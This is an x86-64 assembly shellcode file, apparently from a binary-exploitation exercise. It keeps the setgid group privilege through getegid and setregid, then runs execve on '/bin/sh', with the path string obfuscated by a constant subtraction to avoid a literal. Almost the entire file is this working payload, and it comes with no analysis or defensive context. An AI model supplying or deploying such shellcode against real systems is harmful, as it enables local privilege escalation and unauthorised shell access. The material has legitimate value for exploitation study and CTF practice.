#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
  /*
      Objective:
        Calling three functions.

        int egid = getegid();
        setregid(egid, egid);
        execve("/bin/sh", 0, 0);
  
  */
  // getegid()
  push $108
  pop  %rax
  syscall
  // save eax
  mov %rax, %rdx

 // setregid
  push $114
  pop  %rax
  mov  %rdx, %rdi
  mov  %rdi, %rsi
  xor  %rdx, %rdx
  syscall
  
  // execve
  xor    %rsi, %rsi
  push   %rsi
  mov    $0x117984407f7a7340, %rsi
  mov    $0x1111111111111111, %rdi
  sub    %rdi, %rsi
  push   %rsi
  push   $0x3b
  pop    %rax
  mov    %rsp, %rdi
  xor    %rsi, %rsi
  xor    %rdx, %rdx
  syscall
